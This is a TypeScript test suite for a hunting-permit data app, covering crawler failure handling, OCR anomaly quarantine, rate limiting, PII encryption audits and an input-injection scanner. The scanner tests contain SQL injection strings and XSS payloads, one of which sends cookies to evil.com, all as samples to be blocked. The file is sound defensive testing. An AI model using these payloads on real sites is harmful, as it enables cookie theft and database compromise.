/**
 * Data Ingestion & Security Crucible — The "goHUNT Status" Tests
 *
 * 5 pipeline and security tests that must pass before we can trust our own data.
 *
 * PART 1: F&G Crawler Accuracy Tests
 *   1. Broken F&G DOM Test (Schema Mutation)
 *   2. PDF OCR Hallucination Test (Anomalous Variance)
 *   3. Sanity Constraint Engine (Fiduciary Guardrail)
 *
 * PART 2: Security & Defense Protocols
 *   4. Anti-Scraping Defense (Rate Limiting / WAF)
 *   5. PII & F&G Credential Security (Encryption + Injection)
 *
 * The Verdict:
 *   - Crawlers fail gracefully when HTML breaks
 *   - OCR hallucinations are quarantined for human review
 *   - Impossible values are REJECTED before reaching the DB
 *   - Competitor bots get 429'd after 50 requests
 *   - User F&G credentials are encrypted at rest (AES-256)
 *   - SQL injection and XSS are blocked on every input
 */

import { describe, it, expect, beforeEach } from "vitest";

// ── Crawler Resilience ──
import {
  validateDOMStructure,
  checkAnomaly,
  validateSanityConstraints,
  runCrawlPipeline,
  setLastKnownGood,
  getLastKnownGood,
  getAlertLog,
  clearAlertLog,
  clearLastKnownGoodRegistry,
  type DOMSchema,
  type CrawlResult,
  type CrawlerExtractedData,
  type HistoricalDataPoint,
} from "../crawler-resilience";

// ── Security Protocols ──
import {
  RateLimiter,
  DEFAULT_RATE_LIMIT,
  auditPIICompliance,
  scanForInjection,
  PII_FIELD_REGISTRY,
} from "../security-protocols";

// ── Existing Data Airlock (integration) ──
import { evaluateSnapshot, type StagingSnapshot } from "../data-airlock";

// ============================================================================
// MOCK DATA BUILDERS
// ============================================================================

function makeValidCOHtml(): string {
  return `
    <html>
    <body>
      <div class="fee-table">
        <table id="elk-fees">
          <tr><th>Species</th><th>NR Tag Fee</th></tr>
          <tr><td>Elk</td><td>$825.03</td></tr>
          <tr><td>Mule Deer</td><td>$494.47</td></tr>
          <tr><td>Moose</td><td>$2,758.49</td></tr>
          <tr><td>Bighorn Sheep</td><td>$2,758.49</td></tr>
          <tr><td>Mountain Goat</td><td>$2,758.49</td></tr>
        </table>
      </div>
    </body>
    </html>
  `;
}

function makeBrokenCOHtml(): string {
  // Colorado redesigned their site — the fee-table class is gone,
  // the table ID changed, and the data is in divs now
  return `
    <html>
    <body>
      <div class="new-redesigned-layout">
        <div class="card-grid">
          <div class="species-card">Elk: See details</div>
          <div class="species-card">Deer: See details</div>
        </div>
      </div>
    </body>
    </html>
  `;
}

const CO_DOM_SCHEMA: DOMSchema = {
  stateId: "CO",
  requiredSelectors: [".fee-table", "#elk-fees", "table"],
  fieldSelectors: {
    elkFee: ".fee-table #elk-fees tr:nth-child(2) td:nth-child(2)",
    deerFee: ".fee-table #elk-fees tr:nth-child(3) td:nth-child(2)",
  },
  minExpectedRows: 4,
};

function makeCleanCrawlResult(stateId: string, data: CrawlerExtractedData): CrawlResult {
  return {
    stateId,
    status: "success",
    data,
    errors: [],
    attemptedAt: new Date().toISOString(),
    durationMs: 1200,
    sourceUrl: `https://fgd.state.${stateId.toLowerCase()}.us`,
  };
}

function makeFailedCrawlResult(stateId: string, status: CrawlResult["status"]): CrawlResult {
  return {
    stateId,
    status,
    data: null,
    errors: [{
      code: "DOM_SELECTOR_MISSING",
      message: `Crawler Failed: ${stateId} HTML structure changed`,
      expectedSelector: ".fee-table",
      severity: "P1",
    }],
    attemptedAt: new Date().toISOString(),
    durationMs: 3500,
    sourceUrl: `https://fgd.state.${stateId.toLowerCase()}.us`,
  };
}

function makeValidWYData(): CrawlerExtractedData {
  return {
    fees: { elk: 828, mule_deer: 452, moose: 2312 },
    pointCosts: { elk: 52, mule_deer: 52, moose: 52 },
    deadlines: {
      elk: { open: "2026-01-02", close: "2026-03-15" },
      mule_deer: { open: "2026-01-02", close: "2026-03-15" },
    },
    drawOdds: { elk: 0.08, mule_deer: 0.15, moose: 0.02 },
    licenseFees: { qualifyingLicense: 412, appFee: 15 },
  };
}

// ============================================================================
// TEST 1: "Broken F&G DOM" Test — Schema Mutation
// ============================================================================

describe("TEST 1 — Broken F&G DOM (Schema Mutation)", () => {
  beforeEach(() => {
    clearAlertLog();
    clearLastKnownGoodRegistry();
  });

  it("validates correct HTML structure passes all selectors", () => {
    const html = makeValidCOHtml();
    const result = validateDOMStructure(html, CO_DOM_SCHEMA);

    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it("detects broken HTML when CO redesigns their website CSS", () => {
    const brokenHtml = makeBrokenCOHtml();
    const result = validateDOMStructure(brokenHtml, CO_DOM_SCHEMA);

    expect(result.valid).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);

    // Every error should be P1 severity (selector missing or insufficient rows)
    for (const error of result.errors) {
      expect(error.severity).toBe("P1");
      expect(["DOM_SELECTOR_MISSING", "DOM_INSUFFICIENT_ROWS"]).toContain(error.code);
    }

    // At least one selector must be flagged as missing
    expect(result.errors.some((e) => e.code === "DOM_SELECTOR_MISSING")).toBe(true);
  });

  it("crawler fails gracefully — does NOT push null/$0/random text to database", () => {
    const failedCrawl = makeFailedCrawlResult("CO", "dom_failure");

    // Set a last known good snapshot
    const goodData = makeValidWYData();
    setLastKnownGood("CO", {
      stateId: "CO",
      data: goodData,
      capturedAt: "2026-02-20T12:00:00Z",
      sourceUrl: "https://cpw.state.co.us",
      dataHash: "abc123",
    });

    const pipelineResult = runCrawlPipeline(failedCrawl, {});

    // PASS CONDITION 1: Pipeline did NOT write bad data
    expect(pipelineResult.pipelineStatus).not.toBe("clean");

    // PASS CONDITION 2: Reverted to Last Known Good
    expect(pipelineResult.usedFallback).toBe(true);
    expect(pipelineResult.cleanData).toEqual(goodData);

    // PASS CONDITION 3: P1 alert was fired
    expect(pipelineResult.alerts.length).toBeGreaterThan(0);
    expect(pipelineResult.alerts[0].severity).toBe("P1");
    expect(pipelineResult.alerts[0].title).toContain("Crawler Failed");
    expect(pipelineResult.alerts[0].title).toContain("CO");
  });

  it("P1 alert persists in the global alert log", () => {
    const failedCrawl = makeFailedCrawlResult("CO", "dom_failure");
    runCrawlPipeline(failedCrawl, {});

    const alertLog = getAlertLog();
    expect(alertLog.length).toBeGreaterThan(0);
    expect(alertLog[0].severity).toBe("P1");
    expect(alertLog[0].source).toBe("crawler");
    expect(alertLog[0].stateId).toBe("CO");
  });

  it("completely failed crawl with no fallback returns failed status", () => {
    const failedCrawl = makeFailedCrawlResult("NV", "network_error");
    // No last known good for NV
    const result = runCrawlPipeline(failedCrawl, {});

    expect(result.pipelineStatus).toBe("failed");
    expect(result.usedFallback).toBe(false);
    expect(result.cleanData).toBeNull();
  });

  it("successful crawl updates the Last Known Good snapshot", () => {
    const goodData = makeValidWYData();
    const crawl = makeCleanCrawlResult("WY", goodData);
    const result = runCrawlPipeline(crawl, {});

    expect(result.pipelineStatus).toBe("clean");
    const lkg = getLastKnownGood("WY");
    expect(lkg).not.toBeNull();
    expect(lkg!.data).toEqual(goodData);
  });
});

// ============================================================================
// TEST 2: PDF OCR Hallucination Test — Anomalous Variance Checker
// ============================================================================

describe("TEST 2 — PDF OCR Hallucination (Anomalous Variance)", () => {
  beforeEach(() => {
    clearAlertLog();
    clearLastKnownGoodRegistry();
  });

  it("detects 90% draw odds when history shows 8-12% (OCR misread)", () => {
    const historicalOdds: HistoricalDataPoint[] = [
      { year: 2023, value: 0.12 },
      { year: 2024, value: 0.11 },
      { year: 2025, value: 0.10 },
    ];

    // OCR misread "8" as "80" or similar — reads 0.90 instead of 0.08
    const result = checkAnomaly("drawOdds", 0.90, historicalOdds, 3, "elk");

    expect(result.isAnomaly).toBe(true);
    expect(result.zScore).toBeGreaterThan(3);
    expect(result.explanation).toContain("ANOMALY");
    expect(result.explanation).toContain("Quarantined");
  });

  it("allows normal variance within historical range", () => {
    const historicalOdds: HistoricalDataPoint[] = [
      { year: 2023, value: 0.12 },
      { year: 2024, value: 0.11 },
      { year: 2025, value: 0.10 },
    ];

    // Normal reading: 0.09 (slight decrease, within range)
    const result = checkAnomaly("drawOdds", 0.09, historicalOdds, 3, "elk");

    expect(result.isAnomaly).toBe(false);
    expect(result.zScore).toBeLessThan(3);
  });

  it("quarantines fee anomalies in the full pipeline", () => {
    const wyData: CrawlerExtractedData = {
      fees: { elk: 828, mule_deer: 55 }, // $55 is the RESIDENT fee, not NR
      pointCosts: { elk: 52, mule_deer: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const crawl = makeCleanCrawlResult("WY", wyData);
    const historicalData: Record<string, HistoricalDataPoint[]> = {
      "WY-mule_deer-fee": [
        { year: 2023, value: 440 },
        { year: 2024, value: 445 },
        { year: 2025, value: 452 },
      ],
    };

    // $55 will fail sanity constraint first (min $300 for WY NR mule deer)
    const result = runCrawlPipeline(crawl, historicalData);

    // Sanity constraint catches it before anomaly detector
    expect(result.pipelineStatus).not.toBe("clean");
    expect(result.sanityViolations.length).toBeGreaterThan(0);
  });

  it("anomaly detector catches fee that passes sanity but is historically impossible", () => {
    // Fee within sanity bounds ($500-$3000 for WY elk) but way off from history
    const wyData: CrawlerExtractedData = {
      fees: { elk: 2800 }, // Within bounds but 3× historical average
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const crawl = makeCleanCrawlResult("WY", wyData);
    const historicalData: Record<string, HistoricalDataPoint[]> = {
      "WY-elk-fee": [
        { year: 2023, value: 810 },
        { year: 2024, value: 820 },
        { year: 2025, value: 828 },
      ],
    };

    const result = runCrawlPipeline(crawl, historicalData);

    expect(result.pipelineStatus).toBe("quarantined");
    expect(result.anomalies.some((a) => a.isAnomaly)).toBe(true);
    expect(result.alerts.some((a) => a.source === "anomaly")).toBe(true);
    expect(result.alerts[0].title).toContain("Anomalous Data Detected");
  });

  it("requires human admin approval for quarantined data", () => {
    const wyData: CrawlerExtractedData = {
      fees: { elk: 2800 },
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const crawl = makeCleanCrawlResult("WY", wyData);
    const result = runCrawlPipeline(crawl, {
      "WY-elk-fee": [
        { year: 2023, value: 810 },
        { year: 2024, value: 820 },
        { year: 2025, value: 828 },
      ],
    });

    // Quarantined = data is available but NOT promoted
    expect(result.pipelineStatus).toBe("quarantined");
    expect(result.cleanData).not.toBeNull(); // Data exists...
    // ...but alert requires human acknowledgment before promotion
    expect(result.alerts[0].acknowledged).toBe(false);

    // The Last Known Good should NOT have been updated
    const lkg = getLastKnownGood("WY");
    expect(lkg).toBeNull(); // Only clean data updates LKG
  });
});

// ============================================================================
// TEST 3: Sanity Constraint Engine — The Fiduciary Guardrail
// ============================================================================

describe("TEST 3 — Sanity Constraint Engine (Fiduciary Guardrail)", () => {
  it("REJECTS WY NR elk at $55 (resident fee extracted instead of NR)", () => {
    const badData: CrawlerExtractedData = {
      fees: { elk: 55 },  // This is the resident fee!
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const result = validateSanityConstraints("WY", badData, "NR");

    expect(result.valid).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.violations[0].violation).toBe("below_min");
    expect(result.violations[0].message).toContain("$55");
    expect(result.violations[0].message).toContain("below minimum");
    expect(result.violations[0].message).toContain("$500");
  });

  it("ACCEPTS valid WY NR elk at $828", () => {
    const goodData: CrawlerExtractedData = {
      fees: { elk: 828 },
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const result = validateSanityConstraints("WY", goodData, "NR");
    expect(result.valid).toBe(true);
    expect(result.violations).toHaveLength(0);
  });

  it("REJECTS impossible draw odds (>100%)", () => {
    const badData: CrawlerExtractedData = {
      fees: { elk: 828 },
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      drawOdds: { elk: 8.0 },  // OCR read "8%" as "800%" (forgot decimal)
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const result = validateSanityConstraints("WY", badData);
    expect(result.valid).toBe(false);
    expect(result.violations.some(
      (v) => v.message.includes("impossible")
    )).toBe(true);
  });

  it("REJECTS $0 tag fee (null extraction)", () => {
    const badData: CrawlerExtractedData = {
      fees: { elk: 0 }, // Crawler returned empty/null, coerced to 0
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const result = validateSanityConstraints("WY", badData, "NR");
    expect(result.valid).toBe(false);
    expect(result.violations[0].violation).toBe("below_min");
  });

  it("sanity failure in pipeline triggers fallback to Last Known Good", () => {
    clearAlertLog();
    clearLastKnownGoodRegistry();

    // Set up a good fallback
    const goodData = makeValidWYData();
    setLastKnownGood("WY", {
      stateId: "WY",
      data: goodData,
      capturedAt: "2026-02-20T12:00:00Z",
      sourceUrl: "https://wgfd.wyo.gov",
      dataHash: "xyz789",
    });

    // Crawler extracts resident fee by mistake
    const badData: CrawlerExtractedData = {
      fees: { elk: 55 }, // Resident fee!
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const crawl = makeCleanCrawlResult("WY", badData);
    const result = runCrawlPipeline(crawl, {});

    // Pipeline REJECTED the bad data
    expect(result.pipelineStatus).toBe("fallback");
    expect(result.usedFallback).toBe(true);
    expect(result.cleanData).toEqual(goodData);

    // P1 alert fired
    expect(result.alerts[0].severity).toBe("P1");
    expect(result.alerts[0].source).toBe("sanity");
  });

  it("validates across multiple species simultaneously", () => {
    const mixedData: CrawlerExtractedData = {
      fees: {
        elk: 828,       // Valid
        mule_deer: 25,  // Invalid: below $300 min for WY NR
        moose: 2312,    // Valid
      },
      pointCosts: { elk: 52, mule_deer: 52, moose: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const result = validateSanityConstraints("WY", mixedData, "NR");
    expect(result.valid).toBe(false);
    // Only mule_deer should fail
    expect(result.violations).toHaveLength(1);
    expect(result.violations[0].message).toContain("mule deer");
  });
});

// ============================================================================
// TEST 4: Anti-Scraping Defense — Rate Limiting / WAF
// ============================================================================

describe("TEST 4 — Anti-Scraping Defense (Rate Limiting / WAF)", () => {
  it("blocks IP after 50 requests in 1 minute, returns 429", () => {
    const limiter = new RateLimiter({
      maxRequests: 50,
      windowMs: 60_000,
      blockThreshold: 50,
      blockDurationMs: 15 * 60_000,
    });

    const attackerIP = "192.168.1.100";
    let blockedAt: number | null = null;

    // Fire 1,000 requests from a single IP
    for (let i = 0; i < 1000; i++) {
      const result = limiter.checkRequest(attackerIP);

      if (!result.allowed && blockedAt === null) {
        blockedAt = i + 1; // Record when the block happened
      }

      // After being blocked, all subsequent requests must return 429
      if (i > 50) {
        expect(result.allowed).toBe(false);
        expect(result.status).toBe(429);
      }
    }

    // PASS CONDITION: Blocked after exactly 51 requests (50 allowed + 1 that triggers block)
    expect(blockedAt).toBe(51);
    expect(limiter.isBlocked(attackerIP)).toBe(true);
  });

  it("allows legitimate users under the rate limit", () => {
    const limiter = new RateLimiter(DEFAULT_RATE_LIMIT);
    const userIP = "10.0.0.1";

    // Normal usage: 20 requests in a minute
    for (let i = 0; i < 20; i++) {
      const result = limiter.checkRequest(userIP);
      expect(result.allowed).toBe(true);
      expect(result.status).toBe(200);
      expect(result.remaining).toBe(DEFAULT_RATE_LIMIT.maxRequests - (i + 1));
    }
  });

  it("tracks separate limits per IP", () => {
    const limiter = new RateLimiter({ maxRequests: 5, windowMs: 60_000, blockThreshold: 5, blockDurationMs: 60_000 });

    // User A: 3 requests (fine)
    for (let i = 0; i < 3; i++) limiter.checkRequest("ip-A");
    expect(limiter.isBlocked("ip-A")).toBe(false);

    // User B: 10 requests (blocked after 5)
    for (let i = 0; i < 10; i++) limiter.checkRequest("ip-B");
    expect(limiter.isBlocked("ip-B")).toBe(true);

    // User A should still be fine
    expect(limiter.isBlocked("ip-A")).toBe(false);
    expect(limiter.checkRequest("ip-A").allowed).toBe(true);
  });

  it("returns retry-after header information", () => {
    const limiter = new RateLimiter({ maxRequests: 2, windowMs: 60_000, blockThreshold: 2, blockDurationMs: 900_000 });

    limiter.checkRequest("bot-ip");
    limiter.checkRequest("bot-ip");
    const blocked = limiter.checkRequest("bot-ip");

    expect(blocked.allowed).toBe(false);
    expect(blocked.status).toBe(429);
    expect(blocked.retryAfterMs).toBeGreaterThan(0);
    expect(blocked.reason).toContain("Rate limit exceeded");
    expect(blocked.reason).toContain("IP blocked");
  });

  it("tracks total request count for analytics", () => {
    const limiter = new RateLimiter(DEFAULT_RATE_LIMIT);
    const ip = "analytics-test";

    for (let i = 0; i < 30; i++) limiter.checkRequest(ip);
    expect(limiter.getRequestCount(ip)).toBe(30);
  });
});

// ============================================================================
// TEST 5: PII & F&G Credential Security
// ============================================================================

describe("TEST 5 — PII & F&G Credential Security", () => {
  describe("PII Encryption Audit", () => {
    it("PASSES when all sensitive fields are AES-256 encrypted", () => {
      const storedFields = {
        fgCustomerId: { value: "enc:abc123", encrypted: true, encryptionMethod: "AES-256" },
        email: { value: "enc:user@test.com", encrypted: true, encryptionMethod: "AES-256" },
        huntLocations: { value: "enc:44.123,-110.456", encrypted: true, encryptionMethod: "AES-256-GCM" },
      };

      const result = auditPIICompliance(storedFields);

      expect(result.compliant).toBe(true);
      expect(result.violations).toHaveLength(0);
      expect(result.passedFields).toHaveLength(3);
    });

    it("FAILS when F&G Customer ID is stored in plaintext", () => {
      const storedFields = {
        fgCustomerId: { value: "CID-12345-WY", encrypted: false, encryptionMethod: null },
        email: { value: "enc:user@test.com", encrypted: true, encryptionMethod: "AES-256" },
      };

      const result = auditPIICompliance(storedFields);

      expect(result.compliant).toBe(false);
      expect(result.violations).toHaveLength(1);
      expect(result.violations[0].fieldName).toBe("fgCustomerId");
      expect(result.violations[0].violation).toContain("PLAINTEXT");
    });

    it("FAILS when F&G portal password is stored with weak encryption", () => {
      const storedFields = {
        fgPortalPassword: { value: "enc:password123", encrypted: true, encryptionMethod: "Base64" },
      };

      const result = auditPIICompliance(storedFields);

      expect(result.compliant).toBe(false);
      expect(result.violations[0].fieldName).toBe("fgPortalPassword");
      expect(result.violations[0].violation).toContain("Base64");
      expect(result.violations[0].violation).toContain("AES-256");
    });

    it("audits all defined PII field categories", () => {
      // Verify the registry has critical fields
      const criticalFields = PII_FIELD_REGISTRY.filter((f) => f.sensitivity === "critical");
      expect(criticalFields.length).toBeGreaterThanOrEqual(3);
      expect(criticalFields.some((f) => f.fieldName === "fgCustomerId")).toBe(true);
      expect(criticalFields.some((f) => f.fieldName === "fgPortalPassword")).toBe(true);
      expect(criticalFields.some((f) => f.fieldName === "paymentMethod")).toBe(true);
    });
  });

  describe("SQL Injection Defense", () => {
    it("blocks classic SQL injection: OR 1=1", () => {
      const result = scanForInjection({
        username: "admin' OR 1=1 --",
      });

      expect(result.safe).toBe(false);
      expect(result.threats[0].type).toBe("sql_injection");
      expect(result.threats[0].field).toBe("username");
    });

    it("blocks UNION SELECT injection", () => {
      const result = scanForInjection({
        search: "elk UNION SELECT * FROM users",
      });

      expect(result.safe).toBe(false);
      expect(result.threats.some((t) => t.type === "sql_injection")).toBe(true);
    });

    it("blocks DROP TABLE injection", () => {
      const result = scanForInjection({
        speciesId: "elk; DROP TABLE users",
      });

      expect(result.safe).toBe(false);
      expect(result.threats[0].type).toBe("sql_injection");
    });

    it("allows clean inputs", () => {
      const result = scanForInjection({
        username: "matt_hunter_2026",
        species: "elk",
        state: "Wyoming",
        notes: "Looking for a good unit in the Bighorns",
      });

      expect(result.safe).toBe(true);
      expect(result.threats).toHaveLength(0);
    });
  });

  describe("XSS Defense", () => {
    it("blocks script tag injection", () => {
      const result = scanForInjection({
        profileBio: '<script>alert("hacked")</script>',
      });

      expect(result.safe).toBe(false);
      expect(result.threats.some((t) => t.type === "xss")).toBe(true);
    });

    it("blocks event handler injection", () => {
      const result = scanForInjection({
        huntNotes: '<img src=x onerror="steal(document.cookie)">',
      });

      expect(result.safe).toBe(false);
      expect(result.threats.some((t) => t.type === "xss")).toBe(true);
    });

    it("blocks javascript: protocol injection", () => {
      const result = scanForInjection({
        url: "javascript:alert(1)",
      });

      expect(result.safe).toBe(false);
    });

    it("allows legitimate HTML-like content in hunt notes", () => {
      const result = scanForInjection({
        notes: "Saw a 350+ bull at 8,000 ft. Wind was 10-15 mph NW. Temperature < 40°F.",
      });

      expect(result.safe).toBe(true);
    });

    it("prevents access to another hunter's $30K portfolio via XSS", () => {
      // Attacker tries to inject cookie-stealing script into a shared note
      const result = scanForInjection({
        sharedNote: 'Great hunting spot! <script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
      });

      expect(result.safe).toBe(false);
      expect(result.threats[0].type).toBe("xss");
      expect(result.threats[0].severity).toBe("critical");
    });
  });

  describe("Combined Security Scan", () => {
    it("catches multiple attack vectors in a single scan", () => {
      const result = scanForInjection({
        username: "admin' OR 1=1 --",                              // SQLi
        bio: '<script>alert("xss")</script>',                      // XSS
        notes: "Normal hunting notes about elk in unit 76",         // Clean
        search: "elk UNION SELECT password FROM users",             // SQLi
      });

      expect(result.safe).toBe(false);
      // Should catch at least 3 threats (2 SQLi + 1 XSS, "notes" is clean)
      expect(result.threats.length).toBeGreaterThanOrEqual(3);

      const sqlThreats = result.threats.filter((t) => t.type === "sql_injection");
      const xssThreats = result.threats.filter((t) => t.type === "xss");
      expect(sqlThreats.length).toBeGreaterThanOrEqual(2);
      expect(xssThreats.length).toBeGreaterThanOrEqual(1);
    });
  });
});

// ============================================================================
// INTEGRATION: Full Pipeline → Airlock → Human Approval Flow
// ============================================================================

describe("Integration — Full Quarantine Dashboard Flow", () => {
  beforeEach(() => {
    clearAlertLog();
    clearLastKnownGoodRegistry();
  });

  it("clean crawl → airlock → auto-promote (no human needed)", () => {
    const cleanData = makeValidWYData();
    const crawl = makeCleanCrawlResult("WY", cleanData);

    // Gate 1-4: Crawler pipeline
    const pipelineResult = runCrawlPipeline(crawl, {});
    expect(pipelineResult.pipelineStatus).toBe("clean");

    // Gate 5: Data Airlock would evaluate the snapshot
    // (In production, cleanData gets wrapped in a StagingSnapshot and evaluated)
    expect(pipelineResult.alerts).toHaveLength(0);
    expect(pipelineResult.cleanData).toEqual(cleanData);
  });

  it("bad crawl → quarantine → human must click Approve", () => {
    // Step 1: Crawler extracts suspicious data
    const suspiciousData: CrawlerExtractedData = {
      fees: { elk: 2500 }, // Way above historical
      pointCosts: { elk: 52 },
      deadlines: { elk: { open: "2026-01-02", close: "2026-03-15" } },
      licenseFees: { qualifyingLicense: 412, appFee: 15 },
    };

    const crawl = makeCleanCrawlResult("WY", suspiciousData);
    const result = runCrawlPipeline(crawl, {
      "WY-elk-fee": [
        { year: 2023, value: 810 },
        { year: 2024, value: 820 },
        { year: 2025, value: 828 },
      ],
    });

    // Step 2: Pipeline quarantines it
    expect(result.pipelineStatus).toBe("quarantined");

    // Step 3: Data sits in quarantine — NOT promoted to production
    const lkg = getLastKnownGood("WY");
    expect(lkg).toBeNull(); // Quarantined data doesn't update LKG

    // Step 4: Alert requires human acknowledgment
    expect(result.alerts[0].acknowledged).toBe(false);

    // Step 5: Human admin verifies → clicks "Deploy to Production"
    // (This is a UI action — we verify the data IS available for review)
    expect(result.cleanData).not.toBeNull();
    expect(result.cleanData!.fees.elk).toBe(2500);
  });
});
